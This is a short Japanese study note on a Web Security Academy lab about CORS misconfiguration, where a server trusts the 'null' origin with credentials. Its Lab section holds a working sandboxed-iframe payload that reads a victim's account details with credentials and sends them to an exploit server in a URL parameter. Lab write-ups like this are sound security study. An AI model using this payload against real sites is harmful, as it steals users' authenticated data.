
Date: 2025-09-18
Tags: 
Links: [[WSA]], [[CORS]]

***
`Origin: null` は、以下のようなケースでブラウザが送信する可能性があります：

- クロスオリジンリダイレクト
- `file://` プロトコルからのリクエスト
- `data:` URI からのリクエスト
- `sandbox` 属性付き `iframe` からのリクエスト

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

これに対して、サーバーが以下のように応答すると…

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

…**任意の`null`オリジンからのクロスオリジンリクエストが許可**されてしまいます。 

***
## Lab

1. **Origin: nullを指定して送信するとAllow: nullを確認

2. **スクリプトを作成**
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
	<script> 
	 var req = new XMLHttpRequest(); 
	 req.onload = reqListener; 
	 req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true); 
	 req.withCredentials = true; 
	 req.send(); 
	 
	 function reqListener() { 
		location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText); }; 
	</script>">
</iframe>
```






***
# References

https://cysec148.hatenablog.com/entry/2025/06/08/182056